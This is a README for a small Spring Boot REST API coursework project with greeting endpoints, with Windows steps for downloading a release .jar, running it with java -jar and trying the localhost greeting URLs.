# 🚀 PAF-Week-05-Submission-Application - Simple REST API Example

[![Download Release](https://img.shields.io/badge/Download-Release-%23FF6F61?style=for-the-badge)](https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases)

---

## 📄 About This Application

PAF-Week-05-Submission-Application is a small program built with Spring Boot. It shows how to create a REST API, which is a way for computers to talk over the internet. This app includes several greeting features. You can use the app to learn how APIs handle different types of requests with values in the web address or in question forms. It also records everything you do, which helps understand how it works.

This app is useful if you want to see how backend services work in Java. It handles things like:

- Multiple greeting messages  
- Using parts of the web address to send information  
- Using optional questions in requests  
- Keeping logs of requests and responses  

You do not have to understand the code. This guide will help you set up the app on your Windows computer and run it.

---

## 💻 System Requirements

Before downloading and running the app, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or later  
- **RAM:** At least 4 GB  
- **Storage:** 200 MB free space  
- **Java:** Java Development Kit (JDK) version 11 or later installed  
- **Internet:** Active internet connection to download files  

If you do not have Java installed, visit [https://www.oracle.com/java/technologies/javase-downloads.html](https://www.oracle.com/java/technologies/javase-downloads.html) to download and install it.

---

## 🎯 Key Features

This application focuses on REST API basics and includes:

- Endpoints with path variables: parts of the URL that change the response.
- Optional query parameters: extra bits of information sent with the request.
- Logging: tracking activity to understand how requests are handled.
- Simple Java and Spring Boot setup for backend services.

---

## 🌟 How to Download the Application

Click the button below to visit the page where you can download the app:

[![Download Release](https://img.shields.io/badge/Download-Release-%233496DB?style=for-the-badge)](https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases)

This page holds different versions of the app. Choose the latest release version for Windows.

---

## 🛠️ How to Install and Run the Application on Windows

Follow these steps to get the app running on your Windows computer:

### Step 1: Go to the download page

Use the buttons above or this link to open the downloads page:

https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases

### Step 2: Download the latest release

Look for the most recent release on the page. Download the file that ends with `.jar`. This is the application file you will run.

### Step 3: Locate the file

Once downloaded, find the `.jar` file in your computer’s default downloads folder or the folder you selected.

### Step 4: Open Command Prompt

- Click the Windows Start menu.  
- Type `cmd` and press Enter to open the Command Prompt window.

### Step 5: Change directory to the download location

In Command Prompt, type the following and press Enter:

```bash
cd %HOMEPATH%\Downloads
```

Replace `Downloads` with the path of the folder where your file is if different.

### Step 6: Run the application

Type the following command and press Enter:

```bash
java -jar PAF-Week-05-Submission-Application.jar
```

Replace `PAF-Week-05-Submission-Application.jar` with the exact file name you downloaded if it is different.

After running this command, the application will start. You will see messages in the window telling you it is ready to use.

### Step 7: Confirm it is running

Open a web browser and visit:

```
http://localhost:8080/
```

You should see a message or instructions on how to use the app.

---

## 🌐 How to Use the Application

This app has several web addresses that show greetings. You can type these addresses in a browser or any API testing tool like Postman.

Here are some example URLs you can visit:

- `http://localhost:8080/greeting`  
  Returns a default greeting message.

- `http://localhost:8080/greeting/{name}`  
  Replace `{name}` with your name. It returns a greeting with your name. Example:  
  `http://localhost:8080/greeting/Alice`

- `http://localhost:8080/greeting/optional?name=Bob`  
  Returns a greeting using the name in the question mark parameter.

This example shows how URLs can have parts that change (path variables) and optional information (query parameters).

---

## 📝 Additional Notes on Logging

This application records each request it receives. Logging helps track the use of the API. You can see logs in the Command Prompt window where you ran the app.

If you want to stop the app, return to the Command Prompt and press `Ctrl + C`. The app will close safely.

---

## 🔗 Useful Links

- Download the app releases here:  
  https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases

- Learn about Java and Spring Boot:  
  https://spring.io/projects/spring-boot

- Install Java on Windows:  
  https://www.oracle.com/java/technologies/javase-jdk11-downloads.html

---

## 📞 Getting Help

If you run into problems:

- Make sure Java is installed correctly by typing `java -version` in Command Prompt.  
- Check the exact file name of the `.jar` file you downloaded.  
- Make sure you typed the command properly to run the jar.

For more information about this project, you can visit the GitHub repository page or ask someone familiar with Java and Windows commands.